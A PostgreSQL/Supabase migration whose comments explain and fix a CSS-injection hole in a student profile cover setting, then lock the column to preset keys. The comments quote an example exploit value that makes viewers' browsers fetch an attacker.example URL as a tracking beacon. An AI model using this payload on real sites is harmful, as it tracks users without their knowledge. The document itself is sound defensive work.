-- Session 58 / batch A2: users.banner_gradient stops being free-text CSS.
--
-- THE PROBLEM (measured, not inferred, 2026-09-12):
--   * has_column_privilege('authenticated','public.users','banner_gradient','UPDATE')
--     = true (granted at 20260903100000_security_hardening.sql:55-60), and
--     policy users_update_self is USING/WITH CHECK (auth.uid() = id). The
--     browser holds the anon key, so
--       PATCH /rest/v1/users?id=eq.<me>  {"banner_gradient": "<anything>"}
--     succeeds and the validator at src/app/api/me/profile/route.ts never
--     runs. There was no CHECK on this column (only users_handle_format_check
--     existed on public.users) and no length cap outside the routes' 4000.
--   * That string is applied verbatim as a CSS `background` on OTHER
--     students' screens: src/components/network/UserCard.tsx (Network),
--     src/components/mobile/ProfileMobile.tsx, public/html/profile.html,
--     public/html/_profilePreview.js (profile cards inside DMs),
--     public/html/_persistence.js (sidebar chip) and
--     src/components/nav-identity-chip.tsx.
--   * `background` is a shorthand that accepts layered images, so
--     "linear-gradient(#000,#000), url(https://attacker.example/b.png?s=1)"
--     makes every viewer's browser fetch a host the author controls — an IP
--     + user-agent + timing beacon built out of a cover-photo setting. There
--     is no CSP (next.config.ts:36-40). The old route validator did not stop
--     it either: g.startsWith("linear-gradient") passes
--     "linear-gradient(#000,#000),url(...)".
--   * Second-order: the column is unbounded through PostgREST, and
--     /api/me/suggested-connections selects it for every person in the list.
--
-- THE FIX: the column stores a PRESET KEY, never CSS. The CSS lives in code
-- (src/lib/profile/cover-themes.ts and the mirror in
-- public/html/_persistence.js). This is the shape orgs.backdrop_preset
-- already has right (orgs_backdrop_preset_check, 20260508140000) — copied
-- here verbatim, plus the grant removal, because an enum key cannot beacon.
--
-- The eight keys are exactly the eight swatches the cover picker has always
-- offered (public/html/profile.html, the old `gradients` array), so no
-- student loses a look they had. '' still means "no cover chosen".
--
-- ---------------------------------------------------------------------------
-- EXISTING ROWS — read before writing this file, and treated explicitly.
-- SELECT over public.users on 2026-09-12: 8 users, 0 NULL banner_gradient,
-- 7 rows hold '' (empty), and exactly ONE row holds a value:
--
--   handle 'tyler' (id b31b80a0-dae5-4f58-868d-6f6fb34e4f2d), 87 chars:
--     linear-gradient(135deg, rgb(28, 28, 30) 0%, rgb(45, 27, 78) 50%, rgb(255, 92, 53) 100%)
--
-- That is preset #5 of the picker ('#1C1C1E → #2D1B4E → #FF5C35'), stored in
-- the browser's own rgb() serialization because public/html/profile.html read
-- the value back OUT of the DOM (coverEl.style.background) before saving.
-- Step 1 below maps it to the key 'ember-night', which resolves to that exact
-- same CSS in code — tyler's cover renders identically before and after.
-- NOTHING IS DROPPED SILENTLY: step 2 aborts the whole migration if any row
-- holds a value this file cannot map, and names the handles so it can be
-- mapped by hand instead of being cleared.
-- ---------------------------------------------------------------------------

-- ─── 1. Map every legacy CSS value to its preset key ───────────────────────
-- Matching is done on a normalized form (lowercased, all whitespace removed)
-- so both spellings are caught: the hex form the picker writes and the
-- rgb() form the browser produces when the value round-trips through the DOM.
WITH preset_css (key, normalized) AS (
  VALUES
    ('peach-sky',   'linear-gradient(135deg,#ffb8a00%,#c8b8ff45%,#b8e4ff100%)'),
    ('peach-sky',   'linear-gradient(135deg,rgb(255,184,160)0%,rgb(200,184,255)45%,rgb(184,228,255)100%)'),
    ('sky-peach',   'linear-gradient(135deg,#b8e4ff0%,#c8b8ff50%,#ffb8a0100%)'),
    ('sky-peach',   'linear-gradient(135deg,rgb(184,228,255)0%,rgb(200,184,255)50%,rgb(255,184,160)100%)'),
    ('mint-lilac',  'linear-gradient(135deg,#eafff50%,#b8e4ff50%,#c8b8ff100%)'),
    ('mint-lilac',  'linear-gradient(135deg,rgb(234,255,245)0%,rgb(184,228,255)50%,rgb(200,184,255)100%)'),
    ('sunrise',     'linear-gradient(135deg,#fff9e00%,#ffb8a050%,#ff5c35100%)'),
    ('sunrise',     'linear-gradient(135deg,rgb(255,249,224)0%,rgb(255,184,160)50%,rgb(255,92,53)100%)'),
    ('ember-night', 'linear-gradient(135deg,#1c1c1e0%,#2d1b4e50%,#ff5c35100%)'),
    ('ember-night', 'linear-gradient(135deg,rgb(28,28,30)0%,rgb(45,27,78)50%,rgb(255,92,53)100%)'),
    ('deep-sea',    'linear-gradient(135deg,#0a16280%,#1a3a5c50%,#2e86ab100%)'),
    ('deep-sea',    'linear-gradient(135deg,rgb(10,22,40)0%,rgb(26,58,92)50%,rgb(46,134,171)100%)'),
    ('orchid',      'linear-gradient(135deg,#2d0a3e0%,#6b21a850%,#c084fc100%)'),
    ('orchid',      'linear-gradient(135deg,rgb(45,10,62)0%,rgb(107,33,168)50%,rgb(192,132,252)100%)'),
    ('pine',        'linear-gradient(135deg,#0d2b1d0%,#16653450%,#4ade80100%)'),
    ('pine',        'linear-gradient(135deg,rgb(13,43,29)0%,rgb(22,101,52)50%,rgb(74,222,128)100%)')
)
UPDATE public.users u
SET banner_gradient = p.key
FROM preset_css p
WHERE lower(translate(u.banner_gradient, E' \t\n\r', '')) = p.normalized;

-- ─── 2. Refuse to continue if anything is left over ────────────────────────
-- A student's setting is never cleared behind their back. If this fires,
-- look at the listed handles, add the mapping above (or pick the closest
-- key by hand), and re-run. Expected to be a no-op today: the single
-- non-empty row is tyler's, mapped in step 1.
DO $$
DECLARE leftovers text;
BEGIN
  SELECT string_agg(format('%s => %L', handle, banner_gradient), E'\n  ')
  INTO leftovers
  FROM public.users
  WHERE banner_gradient IS NOT NULL
    AND banner_gradient <> ''
    AND banner_gradient NOT IN (
      'peach-sky','sky-peach','mint-lilac','sunrise',
      'ember-night','deep-sea','orchid','pine'
    );

  IF leftovers IS NOT NULL THEN
    RAISE EXCEPTION
      'users.banner_gradient holds value(s) this migration cannot map to a preset key. Map them by hand rather than clearing them:%s  %s',
      E'\n  ', leftovers;
  END IF;
END $$;

-- ─── 3. The CHECK — the actual boundary against CSS ────────────────────────
-- Keys must match COVER_THEME_KEYS in src/lib/profile/cover-themes.ts AND
-- VIBE_COVER_THEMES in public/html/_persistence.js. Update here AND there if
-- a preset is ever added (same note orgs_backdrop_preset_check carries).
ALTER TABLE public.users DROP CONSTRAINT IF EXISTS users_banner_gradient_preset_check;
ALTER TABLE public.users ADD CONSTRAINT users_banner_gradient_preset_check
  CHECK (banner_gradient IN (
    '', 'peach-sky','sky-peach','mint-lilac','sunrise',
    'ember-night','deep-sea','orchid','pine'
  ));

-- ─── 4. Take the column off the self-serve UPDATE grant ────────────────────
-- Grants, not routes, are the boundary (the same move already made for
-- users.handle, whose UPDATE grant is false). The CHECK alone would stop
-- arbitrary CSS but would still let any signed-in student PATCH any key
-- straight through PostgREST — which is unenforceable the moment some cover
-- themes are a Vibe+ item. After this, the ONLY writer is the server:
-- /api/me/profile and /api/me/profile-sync write this column with the
-- service-role client scoped to .eq("id", user.id).
-- SELECT stays granted: the key is public display data.
REVOKE UPDATE (banner_gradient) ON public.users FROM authenticated;

-- ---------------------------------------------------------------------------
-- DEPLOY ORDER: apply this AFTER the batch A2 code deploy is live.
--   * The new code writes KEYS and writes them through the service role, so
--     it works with or without this migration.
--   * The code currently in production writes raw CSS through the CALLER's
--     cookie client. Against this migration that is both a CHECK violation
--     and a permission denial, so every cover change on old code would fail
--     with "Couldn't update your cover." Migration last, never first.
--   * Read paths are safe in either order: every render site resolves a key
--     OR a legacy CSS string to a constant from the code-side table.
--
-- HOW TO APPLY BY HAND. The Supabase MCP execute_sql is read-only, and
-- `supabase db push` needs the DB password, which is not on this machine.
--   1. From the repo root, with SUPABASE_ACCESS_TOKEN exported from
--      .env.local (the project ref is in supabase/.temp/project-ref). Use
--      curl, not Python: urllib gets a Cloudflare 1010 block.
--        export SUPABASE_ACCESS_TOKEN="$(grep '^SUPABASE_ACCESS_TOKEN=' .env.local | cut -d= -f2-)"
--        curl -sS -X POST "https://api.supabase.com/v1/projects/$(cat supabase/.temp/project-ref)/database/query" \
--          -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN" \
--          -H "Content-Type: application/json" \
--          --data "$(jq -n --rawfile q supabase/migrations/20260912100000_users_banner_gradient_preset_lock.sql '{query:$q}')"
--   2. Record it so `db push` stays in sync (save the statements to a scratch
--      .sql file and point --rawfile at that, same as above):
--        INSERT INTO supabase_migrations.schema_migrations (version, name)
--        VALUES ('20260912100000', 'users_banner_gradient_preset_lock');
--   3. Verify (read-only; the MCP execute_sql is fine for this):
--        SELECT handle, banner_gradient FROM public.users
--         WHERE banner_gradient <> '' ORDER BY handle;
--        -- expect exactly: tyler | ember-night
--        SELECT conname, pg_get_constraintdef(oid) FROM pg_constraint
--         WHERE conrelid = 'public.users'::regclass AND contype = 'c';
--        -- expect users_banner_gradient_preset_check alongside
--        -- users_handle_format_check
--        SELECT has_column_privilege('authenticated','public.users','banner_gradient','UPDATE');
--        -- expect false
--   4. Live: sign in, open /profile, pick a different cover gradient, hard
--      refresh. It must persist, and tyler's profile must look unchanged.
--
-- ROLLBACK (roll the A2 code back first, or cover changes 500):
--   GRANT UPDATE (banner_gradient) ON public.users TO authenticated;
--   ALTER TABLE public.users DROP CONSTRAINT IF EXISTS users_banner_gradient_preset_check;
--   UPDATE public.users SET banner_gradient =
--     'linear-gradient(135deg, rgb(28, 28, 30) 0%, rgb(45, 27, 78) 50%, rgb(255, 92, 53) 100%)'
--     WHERE banner_gradient = 'ember-night';
--   UPDATE public.users SET banner_gradient = '' WHERE banner_gradient IN (
--     'peach-sky','sky-peach','mint-lilac','sunrise','deep-sea','orchid','pine');
--   DELETE FROM supabase_migrations.schema_migrations WHERE version = '20260912100000';
-- ---------------------------------------------------------------------------
